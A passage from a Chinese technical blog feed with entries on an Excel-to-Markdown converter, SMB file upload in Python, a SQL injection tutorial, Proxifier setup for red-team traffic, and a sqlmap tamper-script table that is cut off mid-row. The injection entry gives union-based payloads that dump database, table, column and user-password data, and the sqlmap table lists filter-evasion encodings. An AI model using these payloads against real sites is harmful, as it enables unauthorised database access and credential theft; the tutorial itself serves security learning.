    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自从我把博客从wordpress转到hexo上就踩了很多坑，其中就包括一个很棘手的问题，就是Markdown语法的表格不支持单元格合并，即使网上有很多excel转Markdown的在线工具可以用，但是都不支持单元格合并。于是我就自己用python写了简单的转换工具出来，希望可以帮助到各位。</p><h1 id="github地址"><a href="#github地址" class="headerlink" title="github地址"></a>github地址</h1><p><a href="https://github.com/helloworldbugs/excel_to_markdown">https://github.com/helloworldbugs/excel_to_markdown</a></p><h1 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">from</span> openpyxl <span class="hljs-keyword">import</span> load_workbook<br><span class="hljs-keyword">import</span> os<br><br>pwd = os.getcwd()<br>inputexcelfile = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;输入excel文件路径：&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">excel_to_markdown_html</span>(<span class="hljs-params">input_file, output_file</span>):<br>    <span class="hljs-comment"># 使用openpyxl加载工作簿</span><br>    wb = load_workbook(input_file)<br>    <br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> sheet_name <span class="hljs-keyword">in</span> wb.sheetnames:<br>            sheet = wb[sheet_name]<br>            <span class="hljs-comment"># 读取Excel文件</span><br>            df = pd.read_excel(input_file, sheet_name=sheet_name, header=<span class="hljs-literal">None</span>, engine=<span class="hljs-string">&#x27;openpyxl&#x27;</span>)<br>            <br>            f.write(<span class="hljs-string">&#x27;&lt;table&gt;\n&#x27;</span>)<br><br>            <span class="hljs-comment"># 获取合并单元格信息</span><br>            merged_cells = sheet.merged_cells.ranges<br>            <br>            <span class="hljs-keyword">for</span> row_idx, row <span class="hljs-keyword">in</span> df.iterrows():<br>                f.write(<span class="hljs-string">&#x27;&lt;tr&gt;\n&#x27;</span>)<br>                <span class="hljs-keyword">for</span> col_idx, cell <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(row):<br>                    cell_value = <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">if</span> pd.isna(cell) <span class="hljs-keyword">else</span> cell<br><br>                    <span class="hljs-comment"># 检查单元格是否是合并单元格的起始单元格</span><br>                    cell_ref = sheet.cell(row=row_idx+<span class="hljs-number">1</span>, column=col_idx+<span class="hljs-number">1</span>).coordinate<br>                    merge_range = <span class="hljs-literal">None</span><br>                    <span class="hljs-keyword">for</span> mr <span class="hljs-keyword">in</span> merged_cells:<br>                        <span class="hljs-keyword">if</span> cell_ref <span class="hljs-keyword">in</span> mr:<br>                            merge_range = mr<br>                            <span class="hljs-keyword">break</span><br>                    <br>                    <span class="hljs-keyword">if</span> merge_range <span class="hljs-keyword">and</span> cell_ref == merge_range.coord.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>]:<br>                        rowspan = merge_range.size[<span class="hljs-string">&#x27;rows&#x27;</span>]<br>                        colspan = merge_range.size[<span class="hljs-string">&#x27;columns&#x27;</span>]<br>                        f.write(<span class="hljs-string">f&#x27;&lt;td rowspan=&quot;<span class="hljs-subst">&#123;rowspan&#125;</span>&quot; colspan=&quot;<span class="hljs-subst">&#123;colspan&#125;</span>&quot;&gt;<span class="hljs-subst">&#123;cell_value&#125;</span>&lt;/td&gt;\n&#x27;</span>)<br>                    <span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> merge_range:<br>                        f.write(<span class="hljs-string">f&#x27;&lt;td&gt;<span class="hljs-subst">&#123;cell_value&#125;</span>&lt;/td&gt;\n&#x27;</span>)<br>                f.write(<span class="hljs-string">&#x27;&lt;/tr&gt;\n&#x27;</span>)<br>            f.write(<span class="hljs-string">&#x27;&lt;/table&gt;\n\n&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    input_file = inputexcelfile<br>    output_file = pwd + <span class="hljs-string">&#x27;\\output.md&#x27;</span>      <span class="hljs-comment"># 修改为你想要的输出文件名</span><br>    excel_to_markdown_html(input_file, output_file)<br></code></pre></td></tr></table></figure><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><ol><li>先安装py库</li></ol><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> pandas openpyxl<br></code></pre></td></tr></table></figure><ol start="2"><li>直接双击py脚本文件，然后会弹出一个cmd窗口，直接把excel表格文件拖进cmd窗口，然后回车即可。完成后会在脚本同级目录下生成一个名为<code>output.md</code>的文件</li></ol>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python上传文件到smb服务器</title>
    <link href="/2024/05/21/%E7%BC%96%E7%A8%8B/python%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%88%B0smb%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2024/05/21/%E7%BC%96%E7%A8%8B/python%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%88%B0smb%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>某天领导安排了个活，要求写某个系统的自动备份脚本，本来是一个很简单的脚本，三两下写好了，领导又开始提要求，要能自动上传到smb服务器上就好了。于是我就在网上到处抄作业，但是尝试了一圈发现网上的教程全是复制粘贴的，全部都是错的，好在后面经过折腾自己弄好了，于是记录一下正确的实现方法</p><h1 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 需要安装模块：pip3 install pysmb</span><br><span class="hljs-keyword">from</span> smb.SMBConnection <span class="hljs-keyword">import</span> SMBConnection    <br><span class="hljs-keyword">import</span> os<br><br>filename = test.<span class="hljs-built_in">zip</span><br>pwd = os.getcwd()<br><br><span class="hljs-comment"># 定义文件路径</span><br>shared_folder_name = <span class="hljs-string">&#x27;安全部门&#x27;</span>   <span class="hljs-comment">#共享文件夹</span><br>local_file_path= pwd+<span class="hljs-string">&#x27;\\&#x27;</span>+filename  <span class="hljs-comment">#要上传的本地文件路径</span><br>remote_file_name = <span class="hljs-string">&#x27;配置文件\\&#x27;</span>+filename    <span class="hljs-comment">#在SMB服务器上保存的文件名</span><br><br><span class="hljs-comment"># 开始上传文件</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在上传文件到smb服务器，请稍等。。。&#x27;</span>)<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># 创建SMB连接</span><br>    conn = SMBConnection(smb_username, smb_password, <span class="hljs-string">&#x27;my_client&#x27;</span>, smb_servers_ip, domain=<span class="hljs-string">&#x27;&#x27;</span>, use_ntlm_v2=<span class="hljs-literal">True</span>, is_direct_tcp=<span class="hljs-literal">True</span>)<br>    conn.connect(smb_servers_ip, <span class="hljs-number">445</span>)<br>    conn.storeFile(shared_folder_name, remote_file_name, <span class="hljs-built_in">open</span>(local_file_path, <span class="hljs-string">&#x27;rb&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;文件上传成功&quot;</span>)<br><br>    <span class="hljs-comment"># 断开SMB连接</span><br>    conn.close()<br><br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;文件上传失败&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>smb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入学习</title>
    <link href="/2024/05/18/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/05/18/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h1><p>依据注入点类型分类</p><ul><li><p>数字类型的注入</p></li><li><p>字符串类型的注入</p></li><li><p>搜索型注入</p></li></ul><p>依据提交方式分类</p><ul><li><p>GET注入</p></li><li><p>POST注入</p></li><li><p>COOKIE注入</p></li><li><p>HTTP头注入(XFF注入、UA注入、REFERER注入)</p></li></ul><p>依据获取信息的方式分类</p><ul><li><p>基于布尔的盲注</p></li><li><p>基于时间的盲注</p></li><li><p>基于报错的注入</p></li><li><p>联合查询注入</p></li><li><p>堆查询注入 (可同时执行多条语句)</p></li></ul><h1 id="information-schema库的对应关系"><a href="#information-schema库的对应关系" class="headerlink" title="information_schema库的对应关系"></a>information_schema库的对应关系</h1><table><tr><td>库</td><td>表</td><td>备注</td><td>字段</td><td>备注</td></tr><tr><td rowspan="6">information_schema</td><td>schemata</td><td>#当前所有库数据</td><td>schema_name</td><td>#库</td></tr><tr><td rowspan="2">tables</td><td rowspan="2">#当前所有表数据</td><td>table_schema</td><td>#库</td></tr><tr><td>table_name</td><td>#表</td></tr><tr><td rowspan="3">columns</td><td rowspan="3">#当前所有字段数据</td><td>table_schema</td><td>#库</td></tr><tr><td>table_name</td><td>#表</td></tr><tr><td>column_name</td><td>#字段</td></tr></table><h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><blockquote><p>下面演示的是单引号字符型注入</p></blockquote><ol><li>探测漏洞</li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;<br>?<span class="hljs-attribute">id</span>=1&quot;<br>?<span class="hljs-attribute">id</span>=1-1<br><span class="hljs-built_in">..</span>.<br></code></pre></td></tr></table></figure><ol start="2"><li>用排序法探测字段总数，用五分法可快速定位</li></ol><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">6</span><span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure><ol start="3"><li>用false报回显位置</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">111</span>,<span class="hljs-number">222</span>,<span class="hljs-number">333</span>,<span class="hljs-number">444</span>,<span class="hljs-number">555</span>,<span class="hljs-number">666</span>-- -<br></code></pre></td></tr></table></figure><ol start="4"><li>用回显位爆当前数据库名和版本号</li></ol><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">111</span>,database(),<span class="hljs-built_in">version</span>(),user(),<span class="hljs-number">555</span>,<span class="hljs-number">666</span><span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure><ol start="5"><li>查询数据库名</li></ol><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">111</span>,group_concat(schema_name),<span class="hljs-number">333</span> <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure><ol start="6"><li>查询security数据库里的表名</li></ol><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">?id=<span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">111</span>,group_concat(table_name),<span class="hljs-number">333</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema =&#x27;security&#x27;-- -<br></code></pre></td></tr></table></figure><ol start="7"><li>查询security数据库users数据表的字段名</li></ol><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">-1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">111</span>,group_concat(column_name),<span class="hljs-number">333</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema =<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name = <span class="hljs-string">&#x27;users&#x27;</span>-- -<br></code></pre></td></tr></table></figure><blockquote><p>至此，查询三要素（库&#x2F;表&#x2F;字段）已集齐，可以删掉information_schema表，进行自由进行查询</p></blockquote><ol start="8"><li>查询security数据库users数据表中的username,password字段的数据</li></ol><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">111</span>,group_concat(username,password),<span class="hljs-number">333</span> <span class="hljs-keyword">from</span> security.users<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure><h1 id="函数注释"><a href="#函数注释" class="headerlink" title="函数注释"></a>函数注释</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">group_concat</span><span class="hljs-params">(<span class="hljs-string">&#x27;要查询的值&#x27;</span>)</span></span>  #让查询的所有数值集合并以逗号分隔显示<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">count</span><span class="hljs-params">(*)</span></span>    #查询有多少条数据<br></code></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">order</span> <span class="hljs-title">by</span>    <span class="hljs-comment">#排序数据</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">limit n,m   #从第n行开始，查询m行数据```</code></pre>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>漏洞专题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试中Proxifier代理工具的应用</title>
    <link href="/2024/05/17/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADProxifier%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <url>/2024/05/17/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADProxifier%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Proxifier介绍"><a href="#Proxifier介绍" class="headerlink" title="Proxifier介绍"></a>Proxifier介绍</h1><p>本文我们需要用到一个工具：Proxifier，有不少师傅应该听过它的大名。<br>Proxifier 是一款代理客户端软件，可以让不支持代理服务器工作的程序变的可行。支持各种操作系统和各代理协议，它的运行模式可以指定端口，指定程序的特点。</p><p>Proxifier 的主要用途是在系统级别通过代理服务器强制 Web 请求，从而使来自不支持代理的应用程序的请求通过代理访问其预期网站。</p><h1 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h1><p>配置其他的之前，要新增一个代理规则<code>127.0.0.1; ::1</code>，动作配置为<code>Direct</code>，也就是直连，如下：</p><p><img src="/2024/05/17/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADProxifier%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%BA%94%E7%94%A8/image.png" alt="alt text"></p><blockquote><p>说明：<br><code>::1</code>是IPv6中的环回地址，将其视为<code>127.0.0.1</code>的IPv6版本<br>有些进程在本地通讯中会用到这个玩意，必须先让它直连，如果它走代理的话对应的进程会出问题的</p></blockquote><p>由此，这条规则在代理列表里面要处于最高（优先进行），通过右边的按钮，将这条规则调整到第一行（优先执行），如下：</p><p><img src="/2024/05/17/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADProxifier%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%BA%94%E7%94%A8/image-1.png" alt="alt text"></p><h1 id="通过Proxifier将VM虚拟机代理"><a href="#通过Proxifier将VM虚拟机代理" class="headerlink" title="通过Proxifier将VM虚拟机代理"></a>通过Proxifier将VM虚拟机代理</h1><p>很多时候，作为攻击队，我们都需要在纯净的武器库虚拟机中完成自己的渗透（因为蜜罐会尝试获取浏览器Cookie和本地文件，用自己的实体机很快就能被溯源），如何直接让所有的虚拟机都走上代理呢？</p><p>注：本文这个方法，无视任何类型的系统类型和对应配置，只要配置VM网卡出网即可被代理</p><p>应用程序填写如下：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">vmware.exe<span class="hljs-comment">; vmnetcfg.exe; vmnat.exe; vmrun.exe; vmware-vmx.exe; mkssandbox.exe; vmware-hostd.exe; vmnat.exe; vmnetdhcp.exe</span><br></code></pre></td></tr></table></figure><p>如下配置：</p><p><img src="/2024/05/17/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADProxifier%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%BA%94%E7%94%A8/image-2.png" alt="alt text"></p><p>这样通过VMware进行渗透的时候就可以走我们设置好的代理了</p><h2 id="VM虚拟机17以上版本-特别补充"><a href="#VM虚拟机17以上版本-特别补充" class="headerlink" title="VM虚拟机17以上版本-特别补充"></a>VM虚拟机17以上版本-特别补充</h2><p>挺多师傅反馈VMware 17以上版本无法将流量代理出来，这时候需要特殊配置</p><p>配置方法如下：</p><p>在Proxifier的“配置文件”的“高级”处，选择“服务与其他用户”，然后勾选上两个选项就可以解决VMware 17以上的版本无法代理的问题</p><p><img src="/2024/05/17/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADProxifier%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%BA%94%E7%94%A8/image-4.png" alt="alt text"></p><p><img src="/2024/05/17/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADProxifier%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%BA%94%E7%94%A8/image-5.png" alt="alt text"></p><h1 id="通过Proxifier进行小程序抓包"><a href="#通过Proxifier进行小程序抓包" class="headerlink" title="通过Proxifier进行小程序抓包"></a>通过Proxifier进行小程序抓包</h1><p>很多时候，作为攻击队，我们还需要关注目标的小程序和公众号作为突破口，如何对小程序抓包呢？通过 Proxifier 还能对PC的微信小程序进行抓包</p><p>应用程序填写如下：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">WeChatApp.exe<span class="hljs-comment">;WechatBrowser.exe;WeChatAppEx.exe</span><br></code></pre></td></tr></table></figure><p>如下配置：</p><p><img src="/2024/05/17/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADProxifier%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%BA%94%E7%94%A8/image-3.png" alt="alt text"></p><p>然后再把抓到的包通过socks5转发到burp上，就可以通过burp对小程序进行渗透了。</p><p>参考链接：<a href="https://blog.zgsec.cn/archives/278.html">https://blog.zgsec.cn/archives/278.html</a></p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>黑客工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2024/05/14/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/sqlmap/"/>
    <url>/2024/05/14/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/sqlmap/</url>
    
    <content type="html"><![CDATA[<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>根据实际情况，可以同时使用多个脚本，使用-v参数可以看到payload的变化。</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-built_in">--tamper</span> <span class="hljs-string">&quot;apostrophemask.py,base64encode.py,multiplespaces.py,space2plus.py&quot;</span> <br></code></pre></td></tr></table></figure><h2 id="脚本列表"><a href="#脚本列表" class="headerlink" title="脚本列表"></a>脚本列表</h2><table><tr><td>支持的数据库</td><td>编号</td><td>脚本名称</td><td>作用</td><td>实现方式</td></tr><tr><td rowspan="16" colspan="1">all</td><td rowspan="2" colspan="1">1</td><td rowspan="2" colspan="1">apostrophemask.py</td><td rowspan="2" colspan="1">用utf8代替引号</td><td>(“1 AND ‘1’=’1”) </td></tr><tr><td>‘1 AND %EF%BC%871%EF%BC%87=%EF%BC%871’ </td></tr><tr><td rowspan="2" colspan="1">2</td><td rowspan="2" colspan="1">base64encode.py </td><td rowspan="2" colspan="1">用base64编码替换</td><td>(“1′ AND SLEEP(5)#”)</td></tr><tr><td>‘MScgQU5EIFNMRUVQKDUpIw==’</td></tr><tr><td rowspan="2" colspan="1">3</td><td rowspan="2" colspan="1">multiplespaces.py</td><td rowspan="2" colspan="1">围绕SQL关键字添加多个空格</td><td>(‘1 UNION SELECT foobar’)</td></tr><tr><td>‘1    UNION     SELECT   foobar’</td></tr><tr><td rowspan="2" colspan="1">4</td><td rowspan="2" colspan="1">space2plus.py</td><td rowspan="2" colspan="1">用+替换空格</td><td>(‘SELECT id FROM users’)</td></tr><tr><td>‘SELECT+id+FROM+users’</td></tr><tr><td rowspan="2" colspan="1">5</td><td rowspan="2" colspan="1">nonrecursivereplacement.py</td><td>双重查询语句。取代predefined SQL关键字with表示 </td><td>(‘1 UNION SELECT 2–‘)</td></tr><tr><td>suitable for替代（例如  .replace（“SELECT”、””)） filters</td><td>‘1 UNIOUNIONN SELESELECTCT 2–‘</td></tr><tr><td rowspan="2" colspan="1">6</td><td rowspan="2" colspan="1">space2randomblank.py</td><td>代替空格字符（“”）从一个随机的空</td><td>(‘SELECT id FROM users’)</td></tr><tr><td>白字符可选字符的有效集</td><td>‘SELECT%0Did%0DFROM%0Ausers’</td></tr><tr><td rowspan="2" colspan="1">7</td><td rowspan="2" colspan="1">unionalltounion.py</td><td rowspan="2" colspan="1">替换UNION ALL SELECT UNION SELECT</td><td>(‘-1 UNION ALL SELECT’)</td></tr><tr><td>‘-1 UNION SELECT’</td></tr><tr><td rowspan="2" colspan="1">8</td><td rowspan="2" colspan="1">securesphere.py</td><td rowspan="2" colspan="1">追加特制的字符串</td><td>(‘1 AND 1=1’)</td></tr><tr><td>“1 AND 1=1 and ‘0having’=’0having'”</td></tr><tr><td rowspan="24" colspan="1">mssql</td><td rowspan="3" colspan="1">1</td><td rowspan="3" colspan="1">space2hash.py</td><td rowspan="3" colspan="1">绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</td><td></td></tr><tr><td>‘1 AND 9227=9227’ </td></tr><tr><td>‘1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227’ </td></tr><tr><td rowspan="3" colspan="1">2</td><td rowspan="3" colspan="1">equaltolike.py</td><td rowspan="3" colspan="1">like 代替等号</td><td></td></tr><tr><td>* Input: SELECT * FROM users WHERE id=1 </td></tr><tr><td>2 * Output: SELECT * FROM users WHERE id LIKE 1 </td></tr><tr><td rowspan="2" colspan="1">3</td><td rowspan="2" colspan="1">space2mssqlblank.py(mssql)</td><td rowspan="2" colspan="1">空格替换为其它空符号</td><td>Input: SELECT id FROM users</td></tr><tr><td>Output: SELECT%08id%02FROM%0Fusers</td></tr><tr><td rowspan="2" colspan="1">4</td><td rowspan="2" colspan="1">space2mssqlhash.py</td><td rowspan="2" colspan="1">替换空格</td><td>(‘1 AND 9227=9227’)</td></tr><tr><td>‘1%23%0AAND%23%0A9227=9227’</td></tr><tr><td rowspan="2" colspan="1">5</td><td rowspan="2" colspan="1">between.py</td><td rowspan="2" colspan="1">用between替换大于号（>）</td><td>(‘1 AND A > B–‘)</td></tr><tr><td>‘1 AND A NOT BETWEEN 0 AND B–‘</td></tr><tr><td rowspan="2" colspan="1">6</td><td rowspan="2" colspan="1">percentage.py</td><td rowspan="2" colspan="1">asp允许每个字符前面添加一个%号</td><td>* Input: SELECT FIELD FROM TABLE</td></tr><tr><td>* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td></tr><tr><td rowspan="2" colspan="1">7</td><td rowspan="2" colspan="1">sp_password.py</td><td rowspan="2" colspan="1">追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td><td>(‘1 AND 9227=9227– ‘)</td></tr><tr><td>‘1 AND 9227=9227– sp_password’</td></tr><tr><td rowspan="2" colspan="1">8</td><td rowspan="2" colspan="1">charencode.py</td><td rowspan="2" colspan="1">url编码</td><td>* Input: SELECT FIELD FROM%20TABLE</td></tr><tr><td>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td></tr><tr><td rowspan="2" colspan="1">9</td><td rowspan="2" colspan="1">randomcase.py</td><td rowspan="2" colspan="1">随机大小写</td><td>* Input: INSERT</td></tr><tr><td>* Output: InsERt</td></tr><tr><td rowspan="2" colspan="1">10</td><td rowspan="2" colspan="1">charunicodeencode.py</td><td rowspan="2" colspan="1">字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE</td></tr><tr><td>* Output: 